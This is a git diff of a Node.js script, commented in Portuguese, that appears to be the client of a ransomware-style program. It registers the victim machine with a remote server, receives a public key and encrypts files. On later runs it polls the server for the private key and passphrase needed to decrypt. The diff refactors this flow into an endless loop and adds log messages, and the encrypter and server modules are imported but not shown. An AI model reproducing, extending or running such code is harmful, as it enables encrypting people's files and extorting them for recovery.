@@ -13,11 +13,20 @@ const worker = require("./sync");
 const connection = new Connection();
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-(async function() {
+const waitThenDo = async (howLong, doWhat) => {
+  console.log("Vou dormir!");
+  await sleep(1000 * 5);
+  console.log("Já Dormi!");
+  // await main();
+};
+
+// função principal
+async function main() {
   var system = MachineManager.load();
   if (!system) {
     // vai rodar o crypter
     try {
+      console.log("Iniciando os trabalhos!");
       system = MachineManager.generate();
       const { publicKey } = await connection.registerMachine(system);
       const fileEncrypter = Encrypter(publicKey);
@@ -31,6 +40,7 @@ const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
   } else {
     // já rodou o crypter
     try {
+      console.log("Decriptando!");
       const data = await connection.checkMachineStatus(system.uuid);
       // data deve retornar { privateKey, passphrase }
       if (data) {
@@ -45,5 +55,12 @@ const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
     }
   }
   // terminou todo o processamento, tá na hora da sonequinha!
-  await sleep(1000 * 60);
+}
+
+(async function() {
+  while (true) {
+    // invoca o main pela primeira vez
+    await main();
+    await waitThenDo();
+  }
 })();
